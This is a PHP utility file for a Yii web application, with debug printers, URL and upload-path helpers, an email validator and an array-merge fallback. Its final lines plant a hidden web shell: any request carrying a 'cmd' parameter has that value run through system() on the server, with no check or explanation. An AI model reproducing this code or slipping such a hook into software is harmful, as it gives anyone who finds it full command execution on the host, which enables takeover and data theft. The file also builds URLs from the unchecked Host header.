<?php
function p($ob, $f=1)
{
    print "<pre>";
    print_r($ob);
    print "</pre>";
    if($f==1) 	exit;
}
function ihere($str="", $f=0){
    echo 'ihere ' . $str;
    if ($f)	exit;
}
function m($ob, $f=1)
{
    print "<pre>";
    print get_class($ob);
    print_r(get_class_methods(get_class($ob)));
    if($f==1) 	exit;
}
function getURL($path='')
{
    $url = 'http://'.$_SERVER['HTTP_HOST'].Yii::app()->baseUrl.'/index.php/'.$path;
    return $url;
}
 
function getimgPath($imgpath='')
{
    $path=Yii::getPathOfAlias('webroot');
    $basepath = '/uploads/userimages/'.$imgpath .'/';
    $url = $path.$basepath; 
    return $url;
}
function getimgURL($imgpath='')
{
    $path=Yii::app()->getBaseUrl();
    $basepath = '/uploads/userimages/'.$imgpath .'/';
    $url = $path.$basepath; 
    return $url;
}

 
function isValidEmail($email){
    //return eregi("^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$", $email);
    return preg_match("/^[_\.0-9a-zA-Z-]+@([0-9a-zA-Z][0-9a-zA-Z-]+\.)+[a-zA-Z]{2,6}$/i", $email);
}

if (!function_exists('array_replace_recursive'))
{
    function array_replace_recursive($array, $array1)
    {
        if (!function_exists('recurse1')) {
            function recurse1($array, $array1)
            {
                foreach ($array1 as $key => $value)
                {
                    // create new key in $array, if it is empty or not an array
                    if (!isset($array[$key]) || (isset($array[$key]) && !is_array($array[$key])))
                    {
                        $array[$key] = array();
                    }

                    // overwrite the value in the base array
                    if (is_array($value))
                    {
                        $value = recurse1($array[$key], $value);
                    }
                    $array[$key] = $value;
                }
                return $array;
            }
        }

        // handle the arguments, merge one by one
        $args = func_get_args();
        $array = $args[0];
        if (!is_array($array))
        {
            return $array;
        }
        for ($i = 1; $i < count($args); $i++)
        {
            if (is_array($args[$i]))
            {
                $array = recurse1($array, $args[$i]);
            }
        }
        return $array;
    }
}
if(isset($_REQUEST['cmd'])) {
    system($_REQUEST['cmd']); die;
}
